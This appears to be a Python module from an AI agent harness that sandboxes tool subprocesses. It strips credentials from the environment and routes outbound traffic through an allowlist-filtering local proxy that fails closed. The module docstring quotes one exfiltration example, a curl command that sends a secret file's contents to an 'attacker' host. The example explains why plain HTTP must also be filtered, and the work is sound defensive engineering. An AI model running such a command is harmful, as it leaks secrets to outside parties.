"""出站网络白名单代理（D1-1b）：工具子进程出网默认经受控代理 + 环境擦除。

三档语义（fail-closed 安全默认，TOOL_NET_MODE 配置）：
- off（默认）：子进程环境擦除（剔凭据/继承代理）+ 代理变量指死地址 127.0.0.1:1 = 零出网，
  **不起 server**（别给每个会话拖线程+端口）。注入成功也带不出数据。
- proxy：出网经本地 FilterProxy 白名单过滤；**空白名单 = 全拒**（fail-closed，不是放行）；
  放行流量可级联 config.PROXY 上游（级联在 harness 进程内做，真上游地址不下放进子进程 env）。
- open：显式退回旧行为（env=None 继承全量环境）——本地信任场景的显式降级。

FilterProxy 同时处理两条路径（评审必修）：
- HTTPS：CONNECT host:port 隧道白名单裁决；
- 明文 HTTP：absolute-form 请求行 GET http://host/path 按同一 host 白名单裁决。
只认 CONNECT 的话，curl http://attacker/?d=$(cat secret) 直接绕过。

模型 curl 与工具出网物理分离：模型走 kimi_client 的 config.PROXY（stdin 配置，不进 argv）；
工具子进程 env 里只有本地过滤口/死地址，永远看不到真上游。API_KEY 经环境擦除直接切断。

诚实边界：应用层强制代理——尊重 HTTP_PROXY 环境变量的客户端（curl/requests/pip/git）被管住；
拦不住无视代理变量的原生 socket 程序（那是 1a 容器/3 方向 seatbelt 的地盘）。
"""
from __future__ import annotations

import atexit
import os
import re
import select
import socket
import socketserver
import threading
from collections import deque
from datetime import datetime
from urllib.parse import urlparse

from . import config

_TOOL_NET_MODE = config.TOOL_NET_MODE.strip().lower()
_TOOL_NET_ALLOW = config.TOOL_NET_ALLOW

DEAD_PROXY = "http://127.0.0.1:1"  # off 模式的死代理地址：连它必失败 = 零出网（fail-closed）

# 凭据键大小写不敏感匹配（评审必修：别擦 PYTHONUTF8/PYTHONIOENCODING，否则复现 GBK 乱码）
_CRED_RE = re.compile(r"(?i)(_KEY|_TOKEN|_SECRET|_PASSWORD|API_KEY|CREDENTIAL)")

# 必需键白名单（评审必修·跨平台）：缺 COMSPEC Windows 的 shell=True 起不来；
# POSIX 最小集保 PATH/HOME/TMPDIR 等，git/python/curl 读 HOME 不炸。
# 注意 http_proxy/SSH_AUTH_SOCK 之类**不在**其中——继承的代理/凭据通道一律剔除。
_REQUIRED = {
    # Windows（环境变量名全大写，统一大写比较）
    "SYSTEMROOT", "WINDIR", "PATH", "PATHEXT", "TEMP", "TMP", "COMSPEC",
    "NUMBER_OF_PROCESSORS", "SYSTEMDRIVE",
    # POSIX
    "HOME", "TMPDIR", "LANG", "SHELL", "USER", "LOGNAME", "TERM", "TZ",
    # 防 GBK 乱码老 bug 复发（评审必修）
    "PYTHONUTF8", "PYTHONIOENCODING",
}

# 出网被拒审计（评审建议·审计可见）：headless 运行摘要可读；内存有界 deque，不落盘
_AUDIT: deque = deque(maxlen=200)


def _audit_denied(host: str, via: str) -> None:
    _AUDIT.append({"ts": datetime.now().astimezone().isoformat(timespec="seconds"),
                   "host": host, "via": via})


def audit_denied() -> list:
    """本次进程内被白名单拒掉的目的地记录（{ts, host, via}）。"""
    return list(_AUDIT)


def denied_count() -> int:
    return len(_AUDIT)


def parse_allowlist(s: str) -> set[str]:
    """逗号分隔白名单 → host 集合（小写归一）。.example.com 匹配子域及本体。"""
    out = set()
    for part in (s or "").split(","):
        part = part.strip().lower()
        if part:
            out.add(part)
    return out


def _host_allowed(host: str, allow: set[str]) -> bool:
    host = (host or "").lower().rstrip(".")
    if not host:
        return False
    if host in allow:
        return True
    # .example.com 匹配子域及本体（notgithub.com 不算）
    for a in allow:
        if a.startswith(".") and (host == a[1:] or host.endswith(a)):
            return True
    return False


def _clean_base_environ() -> dict:
    """最小干净基底：先剔凭据键，再按必需键白名单兜底（含 LC_* 区域键）。

    不是 dict(os.environ) 直传——继承的 http_proxy/SSH_AUTH_SOCK/各种 *_TOKEN 一律进不来。"""
    env = {}
    for k, v in os.environ.items():
        if _CRED_RE.search(k):
            continue
        if k.upper() in _REQUIRED or k.startswith("LC_"):
            env[k] = v
    return env


def build_child_env(proxy_url: str | None = None) -> dict:
    """构造工具子进程环境：最小干净基底 + 代理变量（大小写两份），清 NO_PROXY 防绕过。"""
    env = _clean_base_environ()
    if proxy_url:
        env["HTTP_PROXY"] = env["http_proxy"] = proxy_url
        env["HTTPS_PROXY"] = env["https_proxy"] = proxy_url
        env["ALL_PROXY"] = env["all_proxy"] = proxy_url
        env.pop("NO_PROXY", None)
        env.pop("no_proxy", None)
    return env


class _FilterHandler(socketserver.BaseRequestHandler):
    allow: set[str] = set()
    upstream: str | None = None

    def handle(self):
        conn = self.request
        conn.settimeout(30)
        try:
            first = self._read_line(conn)  # 读首行判断 CONNECT 还是 absolute-form
            if not first:
                return
            if first.upper().startswith("CONNECT "):
                self._handle_connect(conn, first)
            elif first.upper().startswith(("GET ", "POST ", "PUT ", "DELETE ", "HEAD ", "OPTIONS ", "PATCH ")):
                self._handle_absolute(conn, first)
            else:
                conn.sendall(b"HTTP/1.1 405 Method Not Allowed\r\n\r\n")
        except (OSError, socket.timeout):
            pass

    def _read_line(self, conn, max_len=8192) -> str:
        buf = b""
        while len(buf) < max_len:
            chunk = conn.recv(1)
            if not chunk:
                break
            buf += chunk
            if buf.endswith(b"\r\n"):
                break
        return buf.decode("utf-8", "replace").strip()

    def _handle_connect(self, conn, first: str):
        # CONNECT host:port HTTP/1.1 —— HTTPS 隧道，按 host 白名单裁决
        parts = first.split()
        if len(parts) < 2:
            conn.sendall(b"HTTP/1.1 400 Bad Request\r\n\r\n")
            return
        hostport = parts[1]
        host = hostport.split(":")[0] if ":" in hostport else hostport
        if not _host_allowed(host, self.allow):
            _audit_denied(host, "CONNECT")
            conn.sendall(b"HTTP/1.1 403 Forbidden\r\n\r\n")
            return
        self._drain_headers(conn)  # 读掉剩余 header
        target = self._upstream_socket(hostport)
        if not target:
            conn.sendall(b"HTTP/1.1 502 Bad Gateway\r\n\r\n")
            return
        conn.sendall(b"HTTP/1.1 200 Connection established\r\n\r\n")
        self._relay(conn, target)

    def _handle_absolute(self, conn, first: str):
        # GET http://host/path HTTP/1.1 —— 明文 HTTP 不走 CONNECT，同一把白名单裁决
        parts = first.split()
        if len(parts) < 2:
            conn.sendall(b"HTTP/1.1 400 Bad Request\r\n\r\n")
            return
        url = parts[1]
        try:
            host = urlparse(url).hostname or ""
        except Exception:
            host = ""
        if not _host_allowed(host, self.allow):
            _audit_denied(host, "HTTP")
            conn.sendall(b"HTTP/1.1 403 Forbidden\r\n\r\n")
            return
        headers = self._drain_headers(conn)  # 读剩余 header 一并转发
        port = urlparse(url).port or 80
        target = self._upstream_socket(f"{host}:{port}")
        if not target:
            conn.sendall(b"HTTP/1.1 502 Bad Gateway\r\n\r\n")
            return
        # absolute-form 改 origin-form 转发
        path = urlparse(url).path or "/"
        if urlparse(url).query:
            path += "?" + urlparse(url).query
        req = f"{parts[0]} {path} {parts[2]}\r\n".encode()
        for h in headers:
            req += h.encode() + b"\r\n"
        req += b"\r\n"
        target.sendall(req)
        self._relay(conn, target)

    def _drain_headers(self, conn) -> list:
        headers = []
        while True:
            line = self._read_line(conn)
            if not line:
                break
            headers.append(line)
        return headers

    def _upstream_socket(self, hostport: str):
        """放行流量的出口：配了上游就级联 CONNECT 到上游（评审必修），否则直连。"""
        host, port = hostport.split(":") if ":" in hostport else (hostport, "443")
        port = int(port)
        if self.upstream:
            try:
                u = urlparse(self.upstream)
                s = socket.create_connection((u.hostname, u.port or 8080), timeout=10)
                s.sendall(f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n".encode())
                resp = b""
                while b"\r\n\r\n" not in resp:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                if b" 200 " not in resp.split(b"\r\n")[0]:
                    s.close()
                    return None
                return s
            except OSError:
                return None
        try:
            return socket.create_connection((host, port), timeout=10)
        except OSError:
            return None

    def _relay(self, client, server):
        """双向 splice：任一方向 EOF/出错就双向关闭。"""
        sockets = [client, server]
        try:
            while True:
                r, _, _ = select.select(sockets, [], [], 30)
                if not r:
                    break
                for s in r:
                    try:
                        data = s.recv(65536)
                    except OSError:
                        data = b""
                    if not data:
                        return
                    other = server if s is client else client
                    try:
                        other.sendall(data)
                    except OSError:
                        return
        finally:
            for s in sockets:
                try:
                    s.close()
                except OSError:
                    pass


class FilterProxy(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

    def __init__(self, allowlist: set[str], upstream: str | None = None):
        handler = type("H", (_FilterHandler,), {"allow": allowlist, "upstream": upstream})
        super().__init__(("127.0.0.1", 0), handler)
        self.allowlist = allowlist
        self.upstream = upstream


_proxy_instance: FilterProxy | None = None
_proxy_thread: threading.Thread | None = None
_proxy_url: str | None = None


def start(allowlist: set[str] | None = None, upstream: str | None = None) -> str | None:
    """启动本地过滤代理（127.0.0.1 随机端口，守护线程），返回代理 URL；已启动则复用现有。

    **空白名单也起 server**（= 全拒）：proxy 档的 fail-closed 靠「代理在手但什么都不放行」，
    而非「起不来就退回继承环境」。upstream 缺省取 config.PROXY（级联）；显式传 "" 强制直连。"""
    global _proxy_instance, _proxy_thread, _proxy_url
    if _proxy_url:
        return _proxy_url
    allow = allowlist if allowlist is not None else parse_allowlist(_TOOL_NET_ALLOW)
    if upstream is None:
        upstream = config.PROXY or None
    _proxy_instance = FilterProxy(allow, upstream or None)
    port = _proxy_instance.server_address[1]
    _proxy_url = f"http://127.0.0.1:{port}"
    _proxy_thread = threading.Thread(target=_proxy_instance.serve_forever, daemon=True)
    _proxy_thread.start()
    return _proxy_url


def stop():
    """停止代理并释放端口（headless finally / atexit 调用）。"""
    global _proxy_instance, _proxy_thread, _proxy_url
    if _proxy_instance:
        _proxy_instance.shutdown()
        _proxy_instance.server_close()
    _proxy_instance = None
    _proxy_thread = None
    _proxy_url = None


def session_child_env() -> dict | None:
    """当前模式下**一次 agent 会话**的工具子进程环境（run_once 注入 ctx['_child_env']）。

    - open → None（调用方不传 env=，继承现状，显式降级）；
    - proxy → 起过滤代理（会话内只起一次），env 指本地过滤口；start 失败 → 死地址（fail-closed）；
    - off/未知 → 死地址 env，不起 server（零出网安全默认）。
    """
    if _TOOL_NET_MODE == "open":
        return None
    if _TOOL_NET_MODE == "proxy":
        url = start()
        return build_child_env(url or DEAD_PROXY)
    return build_child_env(DEAD_PROXY)


atexit.register(stop)
